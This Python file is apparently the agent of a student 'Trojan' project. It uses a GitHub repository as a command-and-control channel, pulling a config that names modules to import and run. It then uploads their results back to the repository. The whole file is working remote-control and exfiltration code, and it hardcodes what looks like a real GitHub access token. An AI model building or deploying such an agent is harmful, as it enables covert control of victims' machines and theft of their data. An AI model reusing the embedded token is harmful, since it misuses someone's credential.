import sys
import os
from github import Github
import json
import importlib
import time


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

GITHUB_TOKEN = "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"
REPO_NAME = "Abdullah-ElPsyKo/EH_Trojan_Project"
CONFIG_FILE = "config/config.json"
DATA_DIR = "data"

# Initialise Github client
g = Github(GITHUB_TOKEN)
repo = g.get_repo(REPO_NAME)

# Download config file
def download_config():
    try:
        contents = repo.get_contents(CONFIG_FILE)
        config_data = json.loads(contents.decoded_content.decode())
        return config_data
    except Exception as e:
        print(f"[ERROR] error: {e}")
        return {"modules": [], "poll_interval": 60}

# Upload results to repo
def upload_results(module, results):
    file_path = f"{DATA_DIR}/{module}_results.json"
    content = json.dumps(results, indent=4)
    try:
        repo_file = repo.get_contents(file_path)
        repo.update_file(file_path, "Updated results", content, repo_file.sha)
    except:
        repo.create_file(file_path, "Created results file", content)

def execute_modules(config):
    for module in config.get("modules", []):
        module_name = module["name"]
        enabled = module.get("enabled", False)
        functions = module.get("functions", {})

        if enabled == False:
            print(f"[INFO] skipping module: {module}")
            continue

        try:
            mod = importlib.import_module(f"modules.{module_name}")
            
            results = {}
            for function_name, params in functions.items():
                func = getattr(mod, function_name, None)
                if not callable(func):
                    print(f"[ERROR] function {function_name} does not exist in the module {module_name}")
                    results[function_name] = "Function not found"
                    continue

                if isinstance(params, list):
                    results[function_name] = func(*params)
                elif isinstance(params, dict):
                    results[function_name] = func(**params)
                else: 
                    results[function_name] = func()

                print(f"[INFO] executed {function_name} from {module_name}")


            upload_results(module_name, {"status": "success", "results": results})

        except Exception as e:
            print(f"[ERROR] failed to execute {module_name}: {e}")
    
def main():
    config = download_config()
    execute_modules(config)
    poll_interval = config.get("poll_interval", 60)
    print(f"[INFO] Waiting {poll_interval} seconds before next execution...\n")
    time.sleep(poll_interval)


if __name__ == "__main__":
    main()